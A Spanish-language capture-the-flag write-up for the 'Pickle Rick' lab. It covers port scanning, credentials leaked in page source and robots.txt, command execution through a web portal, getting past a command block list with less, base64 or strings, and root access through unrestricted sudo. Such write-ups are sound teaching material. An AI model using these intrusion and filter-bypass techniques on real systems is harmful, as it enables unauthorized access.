# Pickle Rick

Fácil , poco realista, pero divertida
## Initial Scan 

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:63:2a:1d:06:ed:17:9a:e4:24:2c:02:a9:0f:da:0d (RSA)
|   256 86:67:93:65:7e:11:65:de:ed:6f:23:f8:18:97:c0:3a (ECDSA)
|_  256 be:c9:b6:80:d7:6e:76:d9:a1:a4:65:20:21:cf:0d:61 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
```

## Enum

### HTTP

```html
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
 ```
  
 En robots .txt tenemos esto
 ```
 Wubbalubbadubdub
 ```
 Podría ser una contraseña
   
#### Gobusting
```
/.hta (Status: 403)
/.hta.php (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd.php (Status: 403)
/assets (Status: 301)
/denied.php (Status: 302)
/index.html (Status: 200)
/login.php (Status: 200)
/portal.php (Status: 302)
/robots.txt (Status: 200)
/server-status (Status: 403)
```

#### Login

Usamos las creds de anrtes para entra en login.php

En el fuente
```html
<!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
```
Ni idea de que es ahora mismo

#### RCE

Tenemos un RCE en portal.php

#### Primer ingrediente

cat esta inhabilitado asi que usamos less para leer el primer ingrediente
```
mr. meeseek hair
```
#### Segundo ingrediente

Ejecutamos 
```
less /home/rick/*
```
Y tendriamos otro
```
1 jerry tear
```
Falta uno

## Privesc

Usando sudo -l en la web shell podemos ver lo siguiente
```
Matching Defaults entries for www-data on ip-10-10-50-6.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-50-6.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```
Asi que podemos leer dentro de /root sin problema

```
sudo less /root/3rd.txt
```


## Funny Fact 

El script del portal.php es el siguiente

```php
function contains($str, array $arr)
{
    foreach($arr as $a) {
        if (stripos($str,$a) !== false) 
            return true;
        }
    return false;
    }
    // Cant use cat
$cmds = array("cat", "head", "more", "tail", "nano", "vim", "vi");
if(isset($_POST["command"])) {
    if(contains($_POST["command"], $cmds)) {
        echo "</br>
```

Con lo cual aparte de less podriamos haber usado base64 | base64 -d o strings
